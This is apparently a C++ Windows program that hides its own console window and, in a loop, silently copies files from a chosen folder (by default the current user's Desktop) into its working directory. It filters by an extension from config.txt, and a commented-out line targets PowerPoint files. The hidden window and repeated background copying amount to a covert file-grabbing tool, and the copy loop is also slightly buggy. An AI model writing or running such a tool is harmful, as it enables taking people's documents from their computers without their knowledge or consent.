//#include <windows.h>
//
//int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
//                    PSTR szCmdParam, int iCmdShow)
//{
//    HWND window;
//    AllocConsole();
//    window = FindWindowA("ConsoleWindowClass", NULL);
//    ShowWindow(window,0);
//    return 0;
//}
#include <bits/stdc++.h>
#include <windows.h>
#include <ctime>
#include <fstream>
#include <tchar.h>
#include <shlobj.h>
using namespace std;
#define _MAX_PATH 10000

void sleep(long d)
{
clock_t start=clock();
while(clock() - start < d);
}

struct List {
	vector<string> files;
	vector<string> folders;
};

struct List lsfiles(string folder)
{
    vector<string> files;
	vector<string> folders;
    char search_path[200];
    sprintf(search_path, "%s*.*", folder.c_str());
    WIN32_FIND_DATA fd;
    HANDLE hFind = ::FindFirstFile(search_path, &fd);
    if(hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if(! (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) )
            {
                files.push_back(fd.cFileName);
            }
            else
			{
				folders.push_back(fd.cFileName);
			}
        }while(::FindNextFile(hFind, &fd));
        ::FindClose(hFind);
    }
	List me;
	me.files = files;
	me.folders = folders;

    return me;
}
string path()
{
    TCHAR path[_MAX_PATH] = _T("");

    HRESULT hr = SHGetFolderPath( 0,CSIDL_DESKTOP,0,0,path );
    for(int i=0; path[i]!=0; i++) if(path[i]=='\\') path[i]='/';
    string str;
    if(SUCCEEDED(hr)) str = path;
    return str;
}
string path(string where)
{
    int ind1 = where.find("%username%"), ind2 = where.find("%USERNAME%");
    if(ind1<where.length())
    {
        char user[100];
        DWORD len = sizeof(user);
        GetUserNameA(user, &len);
        where.replace(ind1, 10, string(user));
    }
    else if(ind2<where.length())
    {
        char user[100];
        DWORD len = sizeof(user);
        GetUserNameA(user, &len);
        where.replace(ind2, 10, string(user));
    }
    for(int i=0; i<where.length(); i++) if(where[i]=='\\') where[i]='/';
    return where;
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdParam, int iCmdShow)
//int main()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window,0);

    freopen("config.txt", "r", stdin);
    string str,where,extension,timer;
    bool inf = false;
    int reapeat=60;
    while(getline(cin,str))
    {
        if(str[0]!='#') break;
    }
    getline(cin, extension);
    if(extension=="") extension="none";
    else if(extension=="all" || extension=="All" || extension=="ALL") extension = "";

    getline(cin, timer);
    if(timer=="INF" || timer == "inf" || timer == "Inf")  inf=true;
    else if(timer!="")
    {
        stringstream ss(timer);
        ss>>reapeat;
    }


    if(str[0]==32) where = path();
    else where = path(str);
    stringstream ss(where);
    ss>>where;
    if(where[where.size()-1]!='/') where+='/';
    //cin>>where;
    cout<<where<<endl<<timer<<endl<<extension<<endl<<reapeat<<endl;
    while(1){
    if(!inf)
    {
        reapeat--;
        if(reapeat<=0) break;
    }
	List you = lsfiles(where); //Get contents of directory

	vector<string>::iterator files_begin = you.files.begin();
	vector<string>::iterator files_end = you.files.end();
	vector<string>::iterator folders_begin = you.folders.begin();
	vector<string>::iterator folders_end = you.folders.end();
	for(; folders_begin != folders_end; folders_begin++){
		cout << "[D] " << *folders_begin << "\n";
	}
	for(; files_begin != files_end; files_begin++){
		char str[500];
		string s = *files_begin;
        char *a=new char[s.size()+1];
        a[s.size()]=0;
        memcpy(a,s.c_str(),s.size());

        s=where+s;
        char *b=new char[s.size()+1];
        b[s.size()]=0;
        memcpy(b,s.c_str(),s.size());

		//if((s.at(s.size()-1)=='t' && s.at(s.size()-2)=='p' && s.at(s.size()-3)=='p' && s.at(s.size()-4)=='.') || (s.at(s.size()-1)=='x' && s.at(s.size()-2)=='t' && s.at(s.size()-3)=='p' && s.at(s.size()-4)=='p' && s.at(s.size()-5)=='.'))
        //{
        if(s.find(extension)<s.length())
        {
            ifstream in(b,ios::binary);
            ofstream out(a,ios::binary);

            if(in.is_open() && out.is_open())
            {
                while(!in.eof())
                {
                    out.put(in.get());
                }
            }

            //Close both files
            in.close();
            out.close();
            //cout << *files_begin << "\n";
        }
	}

	Sleep(60*750);

    }

    CloseWindow(window);
    ExitProcess(0);

    return 0;
}
